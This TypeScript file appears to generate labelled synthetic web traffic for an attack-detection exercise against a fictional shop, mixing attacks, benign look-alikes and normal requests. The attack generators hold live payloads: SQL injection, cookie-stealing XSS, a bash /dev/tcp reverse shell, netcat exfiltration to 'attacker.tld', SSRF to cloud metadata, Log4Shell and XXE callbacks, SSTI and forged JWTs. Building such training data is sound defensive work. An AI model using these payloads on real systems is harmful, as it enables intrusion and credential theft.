import type { DifficultyConfig } from './difficulty';
import {
  attackIpInfo,
  baseDraft,
  CLOUD_ASNS,
  formBody,
  hex,
  internalIp,
  noisyRate,
  P,
  setHeader,
  withBody,
  type Draft,
} from './draft';
import { encodeJwt } from './encoding';
import type { Rng } from './rng';
import type { AttackClass } from './types';

type Make = (rng: Rng, cfg: DifficultyConfig) => Draft;

/** Primary vulnerable endpoint per class, used by patches. */
export const ENDPOINT: Partial<Record<AttackClass, string>> = {
  sqli: '/products',
  xss: '/search',
  traversal: '/download',
  cmdi: '/tools/ping',
  ssrf: '/api/v2/webhooks',
  redirect: '/auth/callback',
  ssti: '/api/v2/render',
  xxe: '/api/v2/invoices',
  jwt: '/api/v2/me',
};

export const ENDPOINT_NOTES: Record<string, string> = {
  '/products': '`id` is always a positive integer.',
  '/search': '`q` is free text, echoed back on the results page.',
  '/download': '`file` is a name inside /var/www/files. No slashes expected except year folders.',
  '/tools/ping': 'Ops tool. `host` is a hostname or IPv4. Passed to a shell (yes, really).',
  '/api/v2/webhooks': 'Server fetches `url` to verify it. Partners only.',
  '/auth/callback': '`next` must be a path on our own site.',
  '/api/v2/render': 'Renders marketing emails with Jinja2. `name` is user input.',
  '/api/v2/invoices': 'Accepts XML invoices from accounting partners.',
  '/api/v2/me': 'Requires an HS256 JWT signed by auth.hypercart.io.',
  '/login': 'Form login. Rate limit is "on the roadmap".',
  '/upload': 'Chunked uploads allowed, max 10 MB.',
  '/admin': 'Back office. Internal network only.',
};

function attack(rng: Rng, cfg: DifficultyConfig, cls: AttackClass, method: string, path: string, explain: string): Draft {
  const d = baseDraft(rng, method, path);
  d.ipInfo = attackIpInfo(rng, cfg);
  d.rate = noisyRate(rng, rng.int(1, 4));
  d.truth = { malicious: true, cls, endpoint: path, explain };
  return d;
}

function legit(rng: Rng, method: string, path: string, explain: string, bait = false): Draft {
  const d = baseDraft(rng, method, path);
  d.truth = { malicious: false, bait, explain };
  return d;
}

// ---------------------------------------------------------------------------
// Attacks
// ---------------------------------------------------------------------------

export const ATTACKS: Record<Exclude<AttackClass, 'policy'>, Make[]> = {
  sqli: [
    (rng, cfg) => {
      const d = attack(rng, cfg, 'sqli', 'GET', '/products', 'UNION-based SQL injection dumping the users table.');
      d.query.push(['id', P(`${rng.int(1, 99)} UNION SELECT username,password FROM users--`)]);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'sqli', 'GET', '/products', 'Boolean-based blind SQLi: always-true condition.');
      d.query.push(['id', P(`${rng.int(1, 99)}' OR '1'='1`)]);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'sqli', 'GET', '/products', 'Time-based blind SQLi: makes the DB sleep to leak bits.');
      d.query.push(['id', P(`${rng.int(1, 99)} AND SLEEP(5)`)]);
      d.query.push(['sort', 'price']);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'sqli', 'POST', '/login', 'Login bypass: comments out the password check.');
      withBody(d, 'application/x-www-form-urlencoded', P(formBody([['username', "admin'--"], ['password', 'whatever']])));
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'sqli', 'GET', '/search', 'Stacked query that drops a table. Bobby Tables says hi.');
      d.query.push(['q', P("Robert'); DROP TABLE Students;--")]);
      return d;
    },
  ],
  xss: [
    (rng, cfg) => {
      const d = attack(rng, cfg, 'xss', 'GET', '/search', 'Reflected XSS: script tag echoed into the results page.');
      d.query.push(['q', P(`<script>fetch('//x.${hex(rng, 4)}.ws/?c='+document.cookie)</script>`)]);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'xss', 'GET', '/search', 'XSS via an image error handler.');
      d.query.push(['q', P('<img src=x onerror=alert(document.domain)>')]);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'xss', 'POST', '/reviews', 'Stored XSS in a product review.');
      withBody(d, 'application/json', P(JSON.stringify({ product: rng.int(1, 500), text: 'great mouse <svg/onload=alert(1)>' })));
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'xss', 'POST', '/profile', 'javascript: URL in a profile link runs on click.');
      withBody(d, 'application/x-www-form-urlencoded', P(formBody([['website', 'javascript:alert(document.cookie)']])));
      return d;
    },
  ],
  traversal: [
    (rng, cfg) => {
      const d = attack(rng, cfg, 'traversal', 'GET', '/download', 'Path traversal to read /etc/passwd.');
      d.query.push(['file', P('../../../../etc/passwd')]);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'traversal', 'GET', '/download', 'Traversal with a filter-dodging ....// pattern.');
      d.query.push(['file', P('....//....//....//proc/self/environ')]);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'traversal', 'GET', '/download', 'Traversal aimed at the app config and its secrets.');
      d.query.push(['file', P('../../app/.env')]);
      return d;
    },
  ],
  scanner: [
    (rng, cfg) => {
      const d = attack(rng, cfg, 'scanner', 'GET', '/products', 'sqlmap announcing itself in the User-Agent.');
      d.query.push(['id', `${rng.int(1, 99)}`]);
      setHeader(d, 'User-Agent', `sqlmap/1.${rng.int(6, 8)}#stable (https://sqlmap.org)`);
      d.rate = noisyRate(rng, 25);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'scanner', 'GET', rng.pick(['/.git/config', '/wp-admin/', '/phpmyadmin/', '/.env', '/server-status']), 'Nikto probing for files we do not even have.');
      setHeader(d, 'User-Agent', 'Mozilla/5.00 (Nikto/2.5.0) (Evasions:None) (Test:007251)');
      setHeader(d, 'Cookie', null);
      d.rate = noisyRate(rng, 30);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'scanner', 'GET', rng.pick(['/.env', '/.git/HEAD', '/backup.zip', '/config.php.bak']), 'Fake Googlebot from a VPS. Real Googlebot comes from Google.');
      setHeader(d, 'User-Agent', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
      setHeader(d, 'Cookie', null);
      d.ipInfo.asn = rng.pick(CLOUD_ASNS);
      d.rate = noisyRate(rng, 18);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'scanner', 'GET', '/', 'Mass scanner fingerprinting. Nobody browses with zgrab.');
      setHeader(d, 'User-Agent', rng.pick(['Mozilla/5.0 zgrab/0.x', 'masscan/1.3 (https://github.com/robertdavidgraham/masscan)', 'Nuclei - Open-source project (github.com/projectdiscovery/nuclei)']));
      setHeader(d, 'Cookie', null);
      d.rate = noisyRate(rng, 40);
      return d;
    },
  ],
  cmdi: [
    (rng, cfg) => {
      const d = attack(rng, cfg, 'cmdi', 'GET', '/tools/ping', 'Command injection: a second command after the semicolon.');
      d.query.push(['host', P(`8.8.8.8;cat /etc/passwd`)]);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'cmdi', 'GET', '/tools/ping', 'Command substitution opens a reverse shell.');
      d.query.push(['host', P(`$(bash -c 'bash -i >& /dev/tcp/${rng.int(11, 200)}.${rng.int(0, 255)}.0.${rng.int(1, 254)}/4444 0>&1')`)]);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'cmdi', 'GET', '/tools/ping', 'Backticks run `id`, piped elsewhere.');
      d.query.push(['host', P('example.com`id`|nc attacker.tld 9001')]);
      return d;
    },
  ],
  ssrf: [
    (rng, cfg) => {
      const d = attack(rng, cfg, 'ssrf', 'POST', '/api/v2/webhooks', 'SSRF to the cloud metadata endpoint to steal IAM creds.');
      withBody(d, 'application/json', P(JSON.stringify({ url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' })));
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'ssrf', 'POST', '/api/v2/webhooks', 'SSRF to the internal Redis on localhost.');
      withBody(d, 'application/json', P(JSON.stringify({ url: rng.pick(['http://127.0.0.1:6379/', 'http://localhost:6379/', 'gopher://127.0.0.1:6379/_FLUSHALL']) })));
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'ssrf', 'POST', '/api/v2/webhooks', 'SSRF with 127.0.0.1 written as a hex integer.');
      withBody(d, 'application/json', P(JSON.stringify({ url: rng.pick(['http://0x7f000001/admin', 'http://2130706433/admin', 'http://[::1]/admin']) })));
      return d;
    },
  ],
  stuffing: [
    (rng, cfg) => {
      const d = attack(rng, cfg, 'stuffing', 'POST', '/login', 'Credential stuffing: hundreds of logins, different users, one IP.');
      const user = `${rng.pick(['anna', 'mike', 'olena', 'j.smith', 'kev', 'taras', 'li.wei'])}${rng.int(1, 999)}@${rng.pick(['gmail.com', 'yahoo.com', 'proton.me'])}`;
      withBody(d, 'application/x-www-form-urlencoded', formBody([['username', user], ['password', rng.pick(['Summer2024!', 'qwerty123', 'P@ssw0rd', 'iloveyou1'])]]));
      d.rate = noisyRate(rng, rng.int(15, 40));
      d.ipInfo.seen = rng.int(180, 900);
      setHeader(d, 'Cookie', null);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'stuffing', 'POST', '/login', 'Brute force on one account from a headless client.');
      withBody(d, 'application/x-www-form-urlencoded', formBody([['username', 'admin@hypercart.io'], ['password', `${rng.pick(['admin', 'hypercart', 'letmein', 'welcome'])}${rng.int(1, 2024)}`]]));
      setHeader(d, 'User-Agent', rng.pick(['python-requests/2.32.3', 'Go-http-client/1.1', 'curl/8.7.1']));
      d.rate = noisyRate(rng, rng.int(12, 30));
      d.ipInfo.seen = rng.int(150, 600);
      return d;
    },
  ],
  redirect: [
    (rng, cfg) => {
      const d = attack(rng, cfg, 'redirect', 'GET', '/auth/callback', 'Open redirect: after login, users get bounced to a phishing site.');
      d.query.push(['code', hex(rng, 16)]);
      d.query.push(['next', P(rng.pick(['//hypercart-login.ru/', 'https://evil.tld/login', '//google.com%2F@phish.tld']))]);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'redirect', 'GET', '/auth/callback', 'Open redirect hidden with a backslash and @ trick.');
      d.query.push(['next', P(rng.pick(['/\\evil.tld', 'https://shop.hypercart.io@evil.tld/']))]);
      return d;
    },
  ],
  ssti: [
    (rng, cfg) => {
      const d = attack(rng, cfg, 'ssti', 'POST', '/api/v2/render', 'SSTI probe: if the email says 49, the template engine is ours.');
      withBody(d, 'application/json', P(JSON.stringify({ template: 'welcome', name: '{{7*7}}' })));
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'ssti', 'POST', '/api/v2/render', 'Jinja2 SSTI walking the object graph to run os.popen.');
      withBody(d, 'application/json', P(JSON.stringify({ template: 'welcome', name: "{{ cycler.__init__.__globals__.os.popen('id').read() }}" })));
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'ssti', 'GET', '/api/v2/render', 'SSTI dumping the Flask config (and its SECRET_KEY).');
      d.query.push(['name', P('{{config.items()}}')]);
      return d;
    },
  ],
  log4shell: [
    (rng, cfg) => {
      const d = attack(rng, cfg, 'log4shell', 'GET', rng.pick(['/', '/products', '/search']), 'Log4Shell: a JNDI lookup in a logged header loads remote code.');
      setHeader(d, 'User-Agent', P(`\${jndi:ldap://${hex(rng, 6)}.oast.fun/a}`));
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'log4shell', 'GET', '/', 'Obfuscated Log4Shell using nested lookups to dodge filters.');
      setHeader(d, 'X-Api-Version', P('${${lower:j}${lower:n}${lower:d}i:${lower:r}mi://45.83.' + rng.int(0, 255) + '.7/Exploit}'));
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'log4shell', 'POST', '/login', 'Log4Shell in the username, which ends up in the auth log.');
      withBody(d, 'application/x-www-form-urlencoded', P(formBody([['username', '${jndi:dns://' + hex(rng, 5) + '.interact.sh}'], ['password', 'x']])));
      return d;
    },
  ],
  xxe: [
    (rng, cfg) => {
      const d = attack(rng, cfg, 'xxe', 'POST', '/api/v2/invoices', 'XXE: an external entity reads a local file into the response.');
      withBody(
        d,
        'application/xml',
        P(`<?xml version="1.0"?><!DOCTYPE inv [<!ENTITY x SYSTEM "file:///etc/passwd">]><invoice><id>${rng.int(1000, 9999)}</id><note>&x;</note></invoice>`),
      );
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'xxe', 'POST', '/api/v2/invoices', 'Blind XXE via a parameter entity calling home.');
      withBody(d, 'application/xml', P(`<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % ext SYSTEM "http://${hex(rng, 6)}.oast.site/x.dtd"> %ext;]><invoice/>`));
      return d;
    },
  ],
  jwt: [
    (rng, cfg) => {
      const d = attack(rng, cfg, 'jwt', 'GET', '/api/v2/me', 'JWT with alg "none" and no signature: forged identity.');
      setHeader(d, 'Authorization', `Bearer ${encodeJwt({ alg: 'none', typ: 'JWT' }, { sub: rng.int(1000, 99999), role: 'admin', exp: 1893456000 }, '')}`);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'jwt', 'GET', '/api/v2/me', 'JWT signed with the wrong algorithm and a role bumped to admin.');
      setHeader(d, 'Authorization', `Bearer ${encodeJwt({ alg: 'None', typ: 'JWT' }, { sub: rng.int(1000, 99999), role: 'admin' }, hex(rng, 8))}`);
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'jwt', 'GET', '/api/v2/me', 'Expired token re-used with a kid path traversal.');
      setHeader(d, 'Authorization', `Bearer ${encodeJwt({ alg: 'HS256', kid: '../../../dev/null' }, { sub: rng.int(1000, 99999), role: 'admin', exp: 1600000000 }, hex(rng, 22))}`);
      return d;
    },
  ],
  smuggling: [
    (rng, cfg) => {
      const d = attack(rng, cfg, 'smuggling', 'POST', '/upload', 'CL.TE request smuggling: front end and back end disagree on where the body ends.');
      d.body = '0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n';
      setHeader(d, 'Content-Type', 'application/octet-stream');
      setHeader(d, 'Content-Length', String(rng.int(4, 6)));
      setHeader(d, 'Transfer-Encoding', 'chunked');
      d.keepLength = true;
      return d;
    },
    (rng, cfg) => {
      const d = attack(rng, cfg, 'smuggling', 'POST', '/upload', 'TE.TE smuggling with an obfuscated Transfer-Encoding.');
      d.body = '5c\r\nGPOST / HTTP/1.1\r\n\r\n0\r\n\r\n';
      setHeader(d, 'Content-Type', 'application/octet-stream');
      setHeader(d, 'Content-Length', '4');
      setHeader(d, 'Transfer-Encoding', rng.pick(['xchunked', 'chunked, identity', ' chunked']));
      d.keepLength = true;
      return d;
    },
  ],
};

// ---------------------------------------------------------------------------
// Bait: legit traffic that looks like an attack class
// ---------------------------------------------------------------------------

export const BAIT: Partial<Record<AttackClass, Make[]>> = {
  sqli: [
    (rng) => {
      const d = legit(rng, 'POST', '/signup', "Customer named O'Brien. Apostrophes are not crimes.", true);
      withBody(d, 'application/x-www-form-urlencoded', P(formBody([['first', rng.pick(['Conan', 'Siobhan', 'Liam'])], ['last', rng.pick(["O'Brien", "O'Neil", "D'Angelo"])]])));
      return d;
    },
    (rng) => {
      const d = legit(rng, 'GET', '/search', 'Someone searching for SQL books.', true);
      d.query.push(['q', P(rng.pick(['select your plan', 'learning SQL: union and joins', 'drop shipping mouse pads', 'sql injection book']))]);
      return d;
    },
  ],
  xss: [
    (rng) => {
      const d = legit(rng, 'GET', '/search', 'A developer searching the docs for a script tag.', true);
      d.query.push(['q', P(rng.pick(['script tag tutorial', 'alert lamp', 'onerror bluetooth fix']))]);
      return d;
    },
    (rng) => {
      const d = legit(rng, 'POST', '/reviews', 'A review with a heart emoticon. Not HTML.', true);
      withBody(d, 'application/json', P(JSON.stringify({ product: rng.int(1, 500), text: 'i <3 this keyboard, 10/10 > my old one' })));
      return d;
    },
  ],
  traversal: [
    (rng) => {
      const d = legit(rng, 'GET', '/download', 'A file with double dots in its name. Not ../', true);
      d.query.push(['file', P(rng.pick(['report..final.pdf', 'invoice...v2.pdf', '2024/q3/report.pdf']))]);
      return d;
    },
  ],
  scanner: [
    (rng) => {
      const d = legit(rng, 'GET', '/products', 'Real Googlebot from Google\'s own network. Good for SEO.', true);
      d.query.push(['id', `${rng.int(1, 500)}`]);
      setHeader(d, 'User-Agent', 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');
      setHeader(d, 'Cookie', null);
      d.ip = `66.249.${rng.int(64, 79)}.${rng.int(1, 254)}`;
      d.ipInfo = { asn: 'AS15169 Google LLC', country: 'US', reputation: 'clean', seen: rng.int(20, 80), internal: false };
      d.rate = noisyRate(rng, 3);
      return d;
    },
    (rng) => {
      const d = legit(rng, 'GET', '/health', 'Our own uptime monitor. Blocking it pages the on-call.', true);
      setHeader(d, 'User-Agent', 'UptimeRobot/2.0; http://www.uptimerobot.com/');
      setHeader(d, 'Cookie', null);
      d.rate = noisyRate(rng, 1);
      return d;
    },
  ],
  cmdi: [
    (rng) => {
      const d = legit(rng, 'GET', '/tools/ping', 'Ops pinging a real host.', true);
      d.ip = internalIp(rng);
      d.ipInfo = { asn: 'internal', country: 'LAN', reputation: 'clean', seen: rng.int(1, 9), internal: true };
      d.query.push(['host', rng.pick(['api.stripe.com', '8.8.8.8', 'db-replica-2.internal'])]);
      return d;
    },
    (rng) => {
      const d = legit(rng, 'GET', '/search', 'Searching for "cats; dogs". Semicolons are punctuation.', true);
      d.query.push(['q', P(rng.pick(['cats; dogs', 'rock & roll vinyl', 'usb-c | lightning cable']))]);
      return d;
    },
  ],
  ssrf: [
    (rng) => {
      const d = legit(rng, 'POST', '/api/v2/webhooks', 'Partner registering a public HTTPS webhook.', true);
      withBody(d, 'application/json', P(JSON.stringify({ url: rng.pick(['https://hooks.slack.com/services/T0/B0/' + hex(rng, 8), 'https://api.shipfast.io/hooks/hypercart', 'https://zapier.com/hooks/catch/' + rng.int(1000, 9999)]) })));
      setHeader(d, 'X-Api-Key', `hc_live_${hex(rng, 16)}`);
      return d;
    },
  ],
  stuffing: [
    (rng) => {
      const d = legit(rng, 'POST', '/login', 'A human who mistyped their password twice.', true);
      withBody(d, 'application/x-www-form-urlencoded', formBody([['username', `${rng.pick(['maria', 'oleh', 'sam'])}@gmail.com`], ['password', 'correct-horse-battery']]));
      d.rate = [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0];
      d.ipInfo.seen = 3;
      return d;
    },
  ],
  redirect: [
    (rng) => {
      const d = legit(rng, 'GET', '/auth/callback', 'Redirect to our own dashboard. Fine.', true);
      d.query.push(['code', hex(rng, 16)]);
      d.query.push(['next', P(rng.pick(['/dashboard', '/orders?page=2', 'https://shop.hypercart.io/cart']))]);
      return d;
    },
  ],
  ssti: [
    (rng) => {
      const d = legit(rng, 'POST', '/api/v2/render', 'Marketing copy with a math-looking price. No braces.', true);
      withBody(d, 'application/json', P(JSON.stringify({ template: 'promo', name: rng.pick(['7 * 7 = deals', 'Get $7 off x 7 days', 'Olena']) })));
      return d;
    },
  ],
  log4shell: [
    (rng) => {
      const d = legit(rng, 'GET', '/search', 'Someone searching for a Java book. Has a $ but no ${jndi:}.', true);
      d.query.push(['q', P(rng.pick(['java logging $5 book', 'log4j migration guide', 'price ${under} 20']))]);
      return d;
    },
  ],
  xxe: [
    (rng) => {
      const d = legit(rng, 'POST', '/api/v2/invoices', 'A normal XML invoice. No DOCTYPE, no entities.', true);
      withBody(d, 'application/xml', P(`<?xml version="1.0"?><invoice><id>${rng.int(1000, 9999)}</id><total currency="EUR">${rng.int(10, 999)}.00</total></invoice>`));
      setHeader(d, 'X-Api-Key', `hc_live_${hex(rng, 16)}`);
      return d;
    },
  ],
  jwt: [
    (rng) => {
      const d = legit(rng, 'GET', '/api/v2/me', 'Valid HS256 token with a real signature.', true);
      setHeader(d, 'Authorization', `Bearer ${encodeJwt({ alg: 'HS256', typ: 'JWT' }, { sub: rng.int(1000, 99999), role: 'customer', exp: 1893456000 }, hex(rng, 43))}`);
      return d;
    },
  ],
  smuggling: [
    (rng) => {
      const d = legit(rng, 'POST', '/upload', 'Normal chunked upload: Transfer-Encoding only, no Content-Length.', true);
      d.body = `${rng.int(10, 99)}\r\n<binary data>\r\n0\r\n\r\n`;
      setHeader(d, 'Content-Type', 'application/octet-stream');
      setHeader(d, 'Transfer-Encoding', 'chunked');
      return d;
    },
  ],
};

// ---------------------------------------------------------------------------
// Plain legit traffic
// ---------------------------------------------------------------------------

export const LEGIT: Make[] = [
  (rng) => legit(rng, 'GET', rng.pick(['/', '/cart', '/orders', '/account', '/deals']), 'Customer browsing the shop.'),
  (rng) => {
    const d = legit(rng, 'GET', '/products', 'Customer looking at a product.');
    d.query.push(['id', `${rng.int(1, 999)}`]);
    return d;
  },
  (rng) => {
    const d = legit(rng, 'GET', '/search', 'Customer searching.');
    d.query.push(['q', P(rng.pick(['wireless mouse', 'mechanical keyboard', 'usb-c hub', '4k monitor', 'standing desk', 'rgb mouse pad']))]);
    if (rng.chance(0.4)) d.query.push(['page', `${rng.int(2, 5)}`]);
    return d;
  },
  (rng) => {
    const d = legit(rng, 'POST', '/cart', 'Adding an item to the cart.');
    withBody(d, 'application/json', JSON.stringify({ product: rng.int(1, 999), qty: rng.int(1, 3) }));
    return d;
  },
  (rng) => {
    const d = legit(rng, 'POST', '/login', 'Normal login.');
    withBody(d, 'application/x-www-form-urlencoded', P(formBody([['username', `${rng.pick(['ivan', 'kate', 'noah', 'yuki'])}${rng.int(1, 99)}@${rng.pick(['gmail.com', 'outlook.com'])}`], ['password', '********']])));
    return d;
  },
  (rng) => {
    const d = legit(rng, 'GET', '/api/v2/orders', 'Mobile app fetching orders.');
    setHeader(d, 'User-Agent', 'HypercartApp/4.2.1 (iOS 18.1)');
    setHeader(d, 'X-Api-Key', `hc_live_${hex(rng, 16)}`);
    d.query.push(['limit', '20']);
    return d;
  },
  (rng) => {
    const d = legit(rng, 'GET', '/download', 'Customer downloading an invoice.');
    d.query.push(['file', `invoice-${rng.int(10000, 99999)}.pdf`]);
    return d;
  },
  (rng) => {
    const d = legit(rng, 'GET', '/static/app.' + hex(rng, 8) + '.js', 'Browser loading a script bundle.');
    setHeader(d, 'Accept', '*/*');
    return d;
  },
];
